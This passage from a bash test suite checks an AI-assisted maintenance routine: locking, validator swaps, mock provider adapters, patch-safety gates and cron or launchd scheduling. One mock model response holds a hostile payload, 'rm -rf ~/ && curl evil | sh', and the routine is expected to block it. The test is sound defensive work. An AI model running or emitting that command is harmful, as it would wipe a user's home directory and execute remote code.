  # Each swap is committed because run-routine.sh refuses a dirty tree, and routine_base_sha is
  # re-read because later cases compare HEAD against it.
  routine_real_validator_copy="$routine_fixture_dir/real-validator.sh"
  cp "$routine_work/tools/validate-agent-directory.sh" "$routine_real_validator_copy"
  routine_commit_validator_swap() {
    routine_git add -- tools/validate-agent-directory.sh
    routine_git commit -q -m "fixture: $1"
    routine_base_sha="$(routine_git rev-parse HEAD)"
  }
  routine_use_standin_validator() {
    cat > "$routine_work/tools/validate-agent-directory.sh" <<'ROUTINE_STANDIN'
#!/usr/bin/env bash
# Routine-fixture stand-in: reproduces only the probe check (Wiki topic status vocabulary)
# with the real validator's exact FAIL wording, at a fraction of the cost. Arguments are
# accepted and ignored so --strict/--full call sites keep working.
set -euo pipefail
root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
status_ok=true
for page in "$root"/knowledge/wiki/topics/*.md; do
  [[ -f "$page" ]] || continue
  page_status="$(awk '
    NR == 1 && $0 != "---" { exit }
    NR > 1 && $0 == "---" { exit }
    index($0, "status:") == 1 { sub(/^[^:]+:[[:space:]]*/, ""); print; exit }
  ' "$page")"
  case "$page_status" in
    active|superseded|archived|retired) ;;
    *)
      printf 'FAIL: %s has an invalid status\n' "${page#"$root"/}"
      status_ok=false
      ;;
  esac
done
[[ "$status_ok" == true ]] || exit 1
printf 'PASS: agent-directory structure is valid\n'
ROUTINE_STANDIN
    routine_commit_validator_swap 'stand-in validator'
  }
  routine_use_real_validator() {
    cp "$routine_real_validator_copy" "$routine_work/tools/validate-agent-directory.sh"
    routine_commit_validator_swap 'real validator restored'
  }

  # Clean dry run: generate nothing and NOOP. The cache is only reported stale, not regenerated.
  seed_routine_last_full
  routine_run maintenance --dry-run
  (( routine_status == 0 )) || fail 'routine fixture: the clean dry run exited non-zero'
  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean dry run'
  routine_expect 'dry_run=true' 'the clean dry run'
  routine_expect 'cache=stale' 'the clean dry run'
  [[ ! -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
    fail 'routine fixture: the dry run regenerated the context cache'

  # Normal run: regenerate the stale cache once with the existing Tool, then NOOP. No commit and no backup.
  routine_run maintenance
  (( routine_status == 0 )) || fail 'routine fixture: the clean run exited non-zero'
  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean run'
  routine_expect 'reasoning=disabled' 'the clean run'
  routine_expect 'cache=rebuilt' 'the clean run'
  [[ -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
    fail 'routine fixture: the clean run did not regenerate the stale cache'
  [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
    fail 'routine fixture: a NOOP run created a commit'
  routine_expect_clean 'the clean run'
  # The real validator has proven the PASS path through run-routine; later runs only need
  # probe-sensitive semantics, so switch to the cheap stand-in from here.
  routine_use_standin_validator
  routine_run maintenance
  routine_expect 'cache=current' 'the warm second run'

  # The daily run owns routing freshness only; the workspace inventory (manifest) is
  # checked and rebuilt once by the full cycle, and a dry run only reports it stale.
  rm -f "$routine_work/.agent-cache/manifest.tsv"
  routine_run maintenance
  routine_expect 'ROUTINE_NOOP id=maintenance' 'the daily run with a missing manifest'
  routine_expect 'cache=current' 'the daily run with a missing manifest'
  [[ ! -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
    fail 'routine fixture: the daily run regenerated the workspace inventory (manifest)'
  routine_run maintenance --full --dry-run
  routine_expect 'cache=manifest-stale' 'the full dry run with a missing manifest'
  [[ ! -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
    fail 'routine fixture: the full dry run regenerated the manifest'
  routine_run maintenance --full
  routine_expect 'ROUTINE_NOOP id=maintenance' 'the full run with a missing manifest'
  routine_expect 'cache=rebuilt' 'the full run with a missing manifest'
  [[ -f "$routine_work/.agent-cache/manifest.tsv" ]] || \
    fail 'routine fixture: the full run did not regenerate the manifest'

  # An unknown Routine ID is rejected without changing anything.
  routine_run bogus-routine
  (( routine_status != 0 )) || fail 'routine fixture: an unknown routine id was accepted'
  routine_expect 'ROUTINE_FAILED id=bogus-routine phase=resolve reason=unknown-routine' 'the unknown id run'

  # On a dirty working tree, report SKIPPED without changing anything.
  printf 'dirty\n' >> "$routine_work/AGENTS.md"
  routine_run maintenance
  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=dirty-working-tree' 'the dirty tree run'
  grep -Fq 'dirty' "$routine_work/AGENTS.md" || \
    fail 'routine fixture: the dirty tree run modified the unowned change'
  routine_git checkout -q -- AGENTS.md

  # With a valid lock (a live PID), never run concurrently and never steal the lock.
  routine_lock_dir="$routine_work/.agent-cache/routines/locks/workspace.lock"
  mkdir -p "$routine_lock_dir"
  {
    printf 'routine=maintenance\npid=%s\n' "$$"
    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
  } > "$routine_lock_dir/info"
  routine_run maintenance
  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the active lock run'
  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: an active lock was removed'

  # A lock whose owner cannot be determined (missing info: a writer mid-acquisition) is active, not stale.
  rm -f "$routine_lock_dir/info"
  routine_run maintenance
  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the ownerless lock run'
  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: a lock without an info file was stolen'

  # Same for an info file with an unparsable PID: never treat it as provably stale.
  {
    printf 'routine=maintenance\npid=%s\n' 'not-a-pid'
    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
  } > "$routine_lock_dir/info"
  routine_run maintenance
  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the corrupt lock run'
  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: a lock with a corrupt info file was stolen'

  # Only a stale lock whose PID is provably dead on the same host is removed before continuing.
  sh -c ':' &
  routine_stale_pid=$!
  wait "$routine_stale_pid" 2>/dev/null || true
  {
    printf 'routine=maintenance\npid=%s\n' "$routine_stale_pid"
    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
  } > "$routine_lock_dir/info"
  routine_run maintenance
  routine_expect 'ROUTINE_NOOP id=maintenance' 'the stale lock run'

  # Restore the real validator for the first broken-probe run, so the FAIL path (probe
  # detection and findings parsing) is proven end-to-end against the real implementation once.
  routine_use_real_validator

  # Create a finding for the deterministic checks: a Wiki topic with an invalid status (a low-risk repair target).
  routine_probe='knowledge/wiki/topics/routine-probe.md'
  {
    printf '%s\n' '---' 'summary: routine fixture probe' 'status: activ' 'aliases: [routine-probe]' '---'
    printf '%s\n' '' '# routine probe'
  } > "$routine_work/$routine_probe"
  routine_git add -- "$routine_probe"
  routine_git commit -q -m 'fixture: broken probe'
  routine_base_sha="$(routine_git rev-parse HEAD)"

  # Reasoning disabled: even with findings, send nothing externally and report only deterministic results.
  routine_run maintenance
  (( routine_status != 0 )) || fail 'routine fixture: validator findings did not fail the routine'
  routine_expect 'ROUTINE_FAILED id=maintenance phase=validation reason=validator-failures' 'the disabled reasoning run'
  routine_expect 'reasoning=disabled' 'the disabled reasoning run'

  # Both real-validator paths are now covered; the remaining cases (provider gating, patch
  # safety, sandbox verification, commit scoping) only need probe-sensitive PASS/FAIL results.
  routine_use_standin_validator

  # Provider unconfigured: the deterministic phases complete; only the reasoning layer is marked unconfigured.
  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true AGENT_ROUTINE_REASONING_PROVIDER=deepseek)
  routine_run maintenance
  routine_expect 'reasoning=unconfigured' 'the unconfigured provider run'

  # An unsupported Provider is rejected without falling back to another Provider.
  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
    AGENT_ROUTINE_REASONING_PROVIDER=somevendor AGENT_ROUTINE_REASONING_MODEL=fixture-model)
  routine_run maintenance
  routine_expect 'reasoning=unsupported-provider' 'the unsupported provider run'
  routine_extra_env=()

  if command -v python3 >/dev/null 2>&1; then
    # --- Mock Provider endpoint (no connection to real APIs)----------------------------------
    routine_mock_state="$routine_fixture_dir/mock"
    mkdir -p "$routine_mock_state"
    cat > "$routine_fixture_dir/mock-server.py" <<'MOCK_SERVER'
import json, os, subprocess, sys
from http.server import BaseHTTPRequestHandler, HTTPServer

state = sys.argv[1]

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length)
        hits_path = os.path.join(state, 'hits')
        hits = 0
        if os.path.exists(hits_path):
            hits = int(open(hits_path).read().strip() or 0)
        hits += 1
        open(hits_path, 'w').write(str(hits))
        with open(os.path.join(state, 'request-%d.json' % hits), 'wb') as f:
            f.write(body)
        with open(os.path.join(state, 'headers-%d.txt' % hits), 'w') as f:
            for name in ('authorization', 'x-api-key', 'anthropic-version'):
                f.write('%s=%s\n' % (name, 'present' if self.headers.get(name) else 'absent'))
            f.write('path=%s\n' % self.path)
        mode_path = os.path.join(state, 'mode')
        if os.path.exists(mode_path):
            mode = open(mode_path).read().strip()
            if mode.startswith('commit:'):
                subprocess.run(['git', '-C', mode.split(':', 1)[1], 'commit', '-q',
                                '--allow-empty', '-m', 'fixture: concurrent writer'], check=False)
            elif mode.startswith('dirty:'):
                repo = mode.split(':', 1)[1]
                with open(os.path.join(repo, 'LICENSE'), 'a') as handle:
                    handle.write('concurrent writer line\n')
                subprocess.run(['git', '-C', repo, 'add', '--', 'LICENSE'], check=False)
        payload = open(os.path.join(state, 'response.json'), 'rb').read()
        self.send_response(200)
        self.send_header('content-type', 'application/json')
        self.send_header('content-length', str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *args):
        pass

server = HTTPServer(('127.0.0.1', 0), Handler)
print(server.server_port, flush=True)
server.serve_forever()
MOCK_SERVER
    env "${routine_env[@]}" python3 "$routine_fixture_dir/mock-server.py" "$routine_mock_state" \
      > "$routine_mock_state/port.txt" 2>/dev/null &
    routine_mock_pid=$!
    cleanup_pids+=("$routine_mock_pid")
    routine_mock_wait=0
    while [[ ! -s "$routine_mock_state/port.txt" ]] && (( routine_mock_wait < 50 )); do
      sleep 0.1 2>/dev/null || sleep 1
      routine_mock_wait=$((routine_mock_wait + 1))
    done
    routine_mock_port="$(head -n 1 "$routine_mock_state/port.txt" 2>/dev/null || true)"
    if [[ ! "$routine_mock_port" =~ ^[0-9]+$ ]]; then
      fail 'routine fixture: the mock provider endpoint did not start'
    else

    # Expected patch: build the real diff fixing the probe's status from the canon.
    sed 's/^status: activ$/status: active/' "$routine_work/$routine_probe" \
      > "$routine_work/$routine_probe.fixed"
    mv "$routine_work/$routine_probe.fixed" "$routine_work/$routine_probe"
    routine_good_patch="$routine_fixture_dir/good.patch"
    routine_git diff > "$routine_good_patch"
    routine_git checkout -q -- "$routine_probe"

    env "${routine_env[@]}" python3 - "$routine_mock_state" "$routine_good_patch" <<'MOCK_RESPONSES'
import json, os, sys
state, patch_path = sys.argv[1], sys.argv[2]
patch = open(patch_path).read()

def chat(content):
    return json.dumps({"choices": [{"message": {"content": content}}]})

def anthropic(content):
    return json.dumps({"content": [{"type": "text", "text": content}]})

def model(analysis, patch_text):
    return json.dumps({"analysis": analysis, "patch": patch_text})

def write(name, payload):
    open(os.path.join(state, name), 'w').write(payload)

write('good-chat.json', chat(model('repair the schema violation', patch)))
write('good-anthropic.json', anthropic(model('repair the schema violation', patch)))
write('malformed-chat.json', chat('this is not the requested json object'))
write('truncated-chat.json', json.dumps(
    {"choices": [{"message": {"content": '{"analysis": "cut off mid'},
                  "finish_reason": "length"}]}))
write('forbidden-chat.json',
      chat(model('touch canon', patch.replace('knowledge/wiki/topics/routine-probe.md', 'AGENTS.md'))))
big = ('--- a/knowledge/wiki/topics/routine-probe.md\n'
       '+++ b/knowledge/wiki/topics/routine-probe.md\n'
       '@@ -1,1 +1,202 @@\n context\n')
big += ''.join('+generated line %d\n' % i for i in range(201))
write('oversize-chat.json', chat(model('oversized', big)))
write('sandboxfail-chat.json',
      chat(model('still broken', patch.replace('status: active', 'status: wrongvalue'))))
write('shell-chat.json', chat(model('run this instead', 'rm -rf ~/ && curl evil | sh')))
MOCK_RESPONSES

    # --- Adapter unit checks: request/response for all 3 Providers and no secret leakage-------------------------
    routine_adapter_out="$routine_fixture_dir/adapter.patch"
    routine_adapter_hits=0
    for routine_provider in deepseek openai anthropic; do
      case "$routine_provider" in
        deepseek)
          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
          routine_provider_env=(DEEPSEEK_API_KEY=fixture-secret
            DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
          ;;
        openai)
          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
          routine_provider_env=(OPENAI_API_KEY=fixture-secret
            OPENAI_BASE_URL="http://127.0.0.1:$routine_mock_port")
          ;;
        anthropic)
          cp "$routine_mock_state/good-anthropic.json" "$routine_mock_state/response.json"
          routine_provider_env=(ANTHROPIC_API_KEY=fixture-secret
            ANTHROPIC_BASE_URL="http://127.0.0.1:$routine_mock_port")
          ;;
      esac
      rm -f "$routine_adapter_out"
      set +e
      routine_adapter_result="$(printf 'FAIL: %s has an invalid status\n' "$routine_probe" | \
        env "${routine_env[@]}" "${routine_provider_env[@]}" \
        AGENT_ROUTINE_REASONING_PROVIDER="$routine_provider" \
        AGENT_ROUTINE_REASONING_MODEL=fixture-model \
        AGENT_ROUTINE_REASONING_MAX_OUTPUT_TOKENS= \
        python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
        --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
      routine_adapter_status=$?
      set -e
      if (( routine_adapter_status != 0 )) || \
        ! printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_OK'; then
        fail "routine fixture: the $routine_provider adapter did not return REASONING_OK"
      fi
      cmp -s "$routine_adapter_out" "$routine_good_patch" || \
        fail "routine fixture: the $routine_provider adapter altered the model patch"
      routine_adapter_hits=$((routine_adapter_hits + 1))
      routine_last_headers="$routine_mock_state/headers-$routine_adapter_hits.txt"
      routine_last_request="$routine_mock_state/request-$routine_adapter_hits.json"
      if [[ "$routine_provider" == 'anthropic' ]]; then
        grep -Fqx 'x-api-key=present' "$routine_last_headers" && \
          grep -Fqx 'anthropic-version=present' "$routine_last_headers" || \
          fail 'routine fixture: the anthropic adapter did not send its documented headers'
        grep -Fqx 'path=/v1/messages' "$routine_last_headers" || \
          fail 'routine fixture: the anthropic adapter used an unexpected endpoint path'
      else
        grep -Fqx 'authorization=present' "$routine_last_headers" || \
          fail "routine fixture: the $routine_provider adapter did not send a bearer token"
        grep -Fqx 'path=/chat/completions' "$routine_last_headers" || \
          fail "routine fixture: the $routine_provider adapter used an unexpected endpoint path"
      fi
      grep -Fq 'fixture-model' "$routine_last_request" || \
        fail "routine fixture: the $routine_provider request does not carry the user-selected model id"
      if grep -Fq 'fixture-secret' "$routine_last_request"; then
        fail "routine fixture: the $routine_provider request body leaked the API key"
      fi
      # No configured output cap: Chat Completions requests omit the cap entirely;
      # Anthropic keeps the API-required max_tokens floor.
      if [[ "$routine_provider" == 'anthropic' ]]; then
        grep -Fq '"max_tokens": 8192' "$routine_last_request" || \
          fail 'routine fixture: the anthropic request lost the API-required max_tokens floor'
      elif grep -Eq 'max_tokens|max_completion_tokens' "$routine_last_request"; then
        fail "routine fixture: the $routine_provider request sent an output cap despite no configured limit"
      fi
    done

    # An explicitly configured output cap still reaches the request body.
    cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
    rm -f "$routine_adapter_out"
    set +e
    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
      AGENT_ROUTINE_REASONING_MAX_OUTPUT_TOKENS=4096 \
      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
    routine_adapter_status=$?
    set -e
    (( routine_adapter_status == 0 )) && \
      printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_OK' || \
      fail 'routine fixture: the explicit output-cap run did not return REASONING_OK'
    routine_adapter_hits=$((routine_adapter_hits + 1))
    grep -Fq '"max_tokens": 4096' "$routine_mock_state/request-$routine_adapter_hits.json" || \
      fail 'routine fixture: an explicitly configured output cap did not reach the request body'

    # Malformed response: classified as a failure; no patch is emitted.
    cp "$routine_mock_state/malformed-chat.json" "$routine_mock_state/response.json"
    rm -f "$routine_adapter_out"
    set +e
    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
    routine_adapter_status=$?
    set -e
    printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_FAILED reason=malformed-response' || \
      fail 'routine fixture: a malformed provider response was not rejected'
    (( routine_adapter_status != 0 )) || fail 'routine fixture: a malformed response exited zero'
    [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a malformed response still produced a patch'

    # Length-capped response: classified as output-truncated, not malformed-response.
    cp "$routine_mock_state/truncated-chat.json" "$routine_mock_state/response.json"
    rm -f "$routine_adapter_out"
    set +e
    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
    routine_adapter_status=$?
    set -e
    printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_FAILED reason=output-truncated' || \
      fail 'routine fixture: a length-capped response was not classified as output-truncated'
    (( routine_adapter_status != 0 )) || fail 'routine fixture: a truncated response exited zero'
    [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a truncated response still produced a patch'

    # A Routine run with reasoning disabled never contacts the endpoint even when one is configured.
    routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=false
      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" DEEPSEEK_API_KEY=fixture-secret
      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model)
    routine_run maintenance
    routine_expect 'reasoning=disabled' 'the disabled-with-endpoint run'
    [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" == "$routine_hits_before" ]] || \
      fail 'routine fixture: a disabled reasoning run still contacted the provider endpoint'

    # --- e2e: safety boundaries for model output------------------------------------------------------
    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model
      DEEPSEEK_API_KEY=fixture-secret DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")

    cp "$routine_mock_state/forbidden-chat.json" "$routine_mock_state/response.json"
    routine_run maintenance
    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the forbidden path run'
    [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
      fail 'routine fixture: a forbidden model patch changed history'
    routine_expect_clean 'the forbidden path run'

    cp "$routine_mock_state/shell-chat.json" "$routine_mock_state/response.json"
    routine_run maintenance
    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the shell command run'
    routine_expect_clean 'the shell command run'

    cp "$routine_mock_state/oversize-chat.json" "$routine_mock_state/response.json"
    routine_run maintenance
    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=patch-limit-exceeded' 'the oversized patch run'
    routine_expect_clean 'the oversized patch run'

    # A candidate failing isolated verification is never applied to the real tree.
    cp "$routine_mock_state/sandboxfail-chat.json" "$routine_mock_state/response.json"
    routine_run maintenance
    routine_expect 'ROUTINE_FAILED id=maintenance phase=validation' 'the sandbox failure run'
    routine_expect 'reasoning=rejected' 'the sandbox failure run'
    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
      fail 'routine fixture: a sandbox-rejected candidate reached the real tree'
    routine_expect_clean 'the sandbox failure run'

    # Abort when HEAD moves just before apply (the mock creates a concurrent commit while responding).
    cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
    printf 'commit:%s\n' "$routine_work" > "$routine_mock_state/mode"
    routine_run maintenance
    routine_expect 'ROUTINE_SKIPPED id=maintenance reason=base-sha-changed' 'the moved HEAD run'
    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
      fail 'routine fixture: a candidate was applied after HEAD moved'
    rm -f "$routine_mock_state/mode"
    routine_base_sha="$(routine_git rev-parse HEAD)"

    # Never mix another writer's work into the routine's changes: the mock stages a foreign file
    # while responding, and the routine must yield without committing anything.
    printf 'dirty:%s\n' "$routine_work" > "$routine_mock_state/mode"
    routine_run maintenance
    routine_expect 'ROUTINE_SKIPPED id=maintenance' 'the concurrent staged change run'
    [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
      fail 'routine fixture: a concurrent staged change still produced a routine commit'
    grep -Fqx 'status: activ' "$routine_work/$routine_probe" || \
      fail 'routine fixture: the candidate was applied despite a concurrent staged change'
    grep -Fq 'concurrent writer line' "$routine_work/LICENSE" || \
      fail 'routine fixture: the routine destroyed the concurrent writer'\''s staged change'
    rm -f "$routine_mock_state/mode"
    routine_git reset -q -- LICENSE
    routine_git checkout -q -- LICENSE

    # Happy path, configured through .env alone (no exported provider variables): this is the
    # normal user setup and proves the executor hands the .env values to the Python adapter.
    routine_extra_env=()
    {
      printf 'AGENT_ROUTINE_REASONING_ENABLED=true\n'
      printf 'AGENT_ROUTINE_REASONING_PROVIDER=deepseek\n'
      printf 'AGENT_ROUTINE_REASONING_MODEL=fixture-model\n'
      printf 'DEEPSEEK_API_KEY=fixture-secret\n'
      printf 'DEEPSEEK_BASE_URL=http://127.0.0.1:%s\n' "$routine_mock_port"
    } > "$routine_work/.env"
    routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
    routine_run maintenance
    (( routine_status == 0 )) || fail 'routine fixture: the low-risk repair run exited non-zero'
    routine_expect 'ROUTINE_OK id=maintenance commit=' 'the low-risk repair run'
    routine_expect 'reasoning=applied' 'the low-risk repair run'
    routine_expect 'backup=unconfigured' 'the low-risk repair run'
    [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" != "$routine_hits_before" ]] || \
      fail 'routine fixture: the .env-only configuration never reached the provider adapter'
    rm -f "$routine_work/.env"
    grep -Fqx 'status: active' "$routine_work/$routine_probe" || \
      fail 'routine fixture: the verified low-risk repair was not applied'
    [[ "$(routine_git rev-parse HEAD)" != "$routine_base_sha" ]] || \
      fail 'routine fixture: the verified repair did not create a scoped commit'
    routine_commit_files="$(routine_git show --name-only --pretty=format: HEAD | grep -c . || true)"
    [[ "$routine_commit_files" == '1' ]] || \
      fail 'routine fixture: the routine commit was not scoped to the repaired file'
    routine_expect_clean 'the low-risk repair run'
    fi
    routine_extra_env=()
  fi

  # --- Scheduler fixture (mock crontab/launchctl, temporary HOME)------------------------------
  routine_schedule_home="$routine_fixture_dir/home"
  routine_mock_bin="$routine_fixture_dir/bin"
  mkdir -p "$routine_schedule_home" "$routine_mock_bin"
  routine_crontab_state="$routine_fixture_dir/crontab.state"
  {
    printf '#!/bin/sh\n'
    printf 'STATE=%s\n' "$routine_crontab_state"
    printf 'case "${1:--}" in\n'
    printf '  -l) [ -f "$STATE" ] && cat "$STATE" || exit 1 ;;\n'
    printf '  -r) rm -f "$STATE" ;;\n'
    printf '  *) cat > "$STATE" ;;\n'
    printf 'esac\n'
  } > "$routine_mock_bin/crontab"
  # Stateful launchctl mock: bootstrap/bootout track a loaded flag, print reflects it,
  # and a fail-flag file makes the next bootstrap fail (for the failed-install scenario).
  {
    printf '#!/bin/sh\n'
    printf 'echo "$@" >> %s\n' "$routine_fixture_dir/launchctl.log"
    printf 'case "$1" in\n'
    printf '  bootstrap) [ -f %s ] && exit 1; touch %s ;;\n' \
      "$routine_fixture_dir/launchctl.fail" "$routine_fixture_dir/launchctl.loaded"
    printf '  bootout) rm -f %s ;;\n' "$routine_fixture_dir/launchctl.loaded"
    printf '  print) [ -f %s ] || exit 1 ;;\n' "$routine_fixture_dir/launchctl.loaded"
    printf 'esac\n'
    printf 'exit 0\n'
  } > "$routine_mock_bin/launchctl"
  chmod +x "$routine_mock_bin/crontab" "$routine_mock_bin/launchctl"
  schedule_run() {
    env "${routine_env[@]}" HOME="$routine_schedule_home" PATH="$routine_mock_bin:$PATH" \
      AGENT_ROUTINE_SCHEDULER_OS="$1" AGENT_DIRECTORY_ROOT="$routine_work" \
      bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance "${@:2}"
  }

  schedule_output="$(schedule_run Linux --scheduler auto --at 03:00 --print)"
  printf '%s\n' "$schedule_output" | grep -Eq '^0 3 \* \* \* ' || \
    fail 'scheduler fixture: the cron render does not schedule 03:00 daily'
  printf '%s\n' "$schedule_output" | grep -Fq 'run-routine.sh maintenance' || \
    fail 'scheduler fixture: the cron render does not run the routine executor'
  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=cron' || \
    fail 'scheduler fixture: auto on a non-Darwin host did not select cron'
  [[ ! -f "$routine_crontab_state" ]] || \
    fail 'scheduler fixture: --print wrote to the crontab'

  schedule_output="$(schedule_run Darwin --scheduler auto --at 03:00 --print)"
  printf '%s\n' "$schedule_output" | grep -Fq 'SCHEDULE_PRINTED routine=maintenance scheduler=launchd' || \
    fail 'scheduler fixture: auto on Darwin did not select launchd'
  printf '%s\n' "$schedule_output" | grep -Fq '<key>StartCalendarInterval</key>' || \
    fail 'scheduler fixture: the launchd render is missing StartCalendarInterval'
  printf '%s\n' "$schedule_output" | grep -Fq '<integer>3</integer>' || \
    fail 'scheduler fixture: the launchd render does not schedule hour 3'
  if find "$routine_schedule_home" -name '*.plist' -print -quit 2>/dev/null | grep -q .; then
    fail 'scheduler fixture: --print wrote a LaunchAgent plist'
  fi

  # Idempotence of cron install, and preservation of unrelated entries.
  printf '0 5 * * * /usr/bin/true # unrelated entry\n' > "$routine_crontab_state"
  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
  schedule_run Linux --scheduler auto --at 03:00 --install >/dev/null
  routine_managed_count="$(grep -cF '# agent-directory routine=maintenance' "$routine_crontab_state" || true)"
  [[ "$routine_managed_count" == '1' ]] || \
    fail 'scheduler fixture: repeated cron installs duplicated the managed entry'
  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
    fail 'scheduler fixture: cron install dropped an unrelated entry'
  schedule_run Linux --scheduler auto --status 2>/dev/null | grep -Fq 'installed=true' || \
    fail 'scheduler fixture: cron status did not report the installed schedule'
  schedule_run Linux --scheduler auto --remove >/dev/null
  if grep -Fq '# agent-directory routine=maintenance' "$routine_crontab_state"; then
    fail 'scheduler fixture: cron remove left the managed entry'
  fi
  grep -Fq '# unrelated entry' "$routine_crontab_state" || \
    fail 'scheduler fixture: cron remove dropped an unrelated entry'

  # Idempotence of launchd install (temporary HOME, mock launchctl).
  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null
  routine_plist_count="$(find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -c . || true)"
  [[ "$routine_plist_count" == '1' ]] || \
    fail 'scheduler fixture: repeated launchd installs did not stay idempotent'
  grep -q 'bootstrap' "$routine_fixture_dir/launchctl.log" || \
    fail 'scheduler fixture: launchd install did not bootstrap the user agent'
  schedule_run Darwin --scheduler auto --status 2>/dev/null | \
    grep -Fq 'installed=true loaded=true' || \
    fail 'scheduler fixture: launchd status did not report the schedule as installed and loaded'
  schedule_run Darwin --scheduler auto --remove >/dev/null
  if find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -q .; then
    fail 'scheduler fixture: launchd remove left the plist'
  fi
  grep -q 'bootout' "$routine_fixture_dir/launchctl.log" || \
    fail 'scheduler fixture: launchd remove did not boot out the user agent'
  schedule_run Darwin --scheduler auto --status 2>/dev/null | \
    grep -Fq 'installed=false loaded=false' || \
    fail 'scheduler fixture: launchd status still reports a removed schedule as present'

  # A failed bootstrap must not leave a configured-but-unloaded plist behind.
  touch "$routine_fixture_dir/launchctl.fail"
  set +e
  schedule_run Darwin --scheduler auto --at 03:00 --install >/dev/null 2>&1
  schedule_bootstrap_status=$?
  set -e
  (( schedule_bootstrap_status != 0 )) || \
    fail 'scheduler fixture: a failed launchd bootstrap was reported as success'
  if find "$routine_schedule_home/Library/LaunchAgents" -name '*.plist' 2>/dev/null | grep -q .; then
    fail 'scheduler fixture: a failed launchd bootstrap left its plist behind'
  fi
  rm -f "$routine_fixture_dir/launchctl.fail"

  # Paths with spaces must survive cron quoting, and XML metacharacters must survive plist rendering.
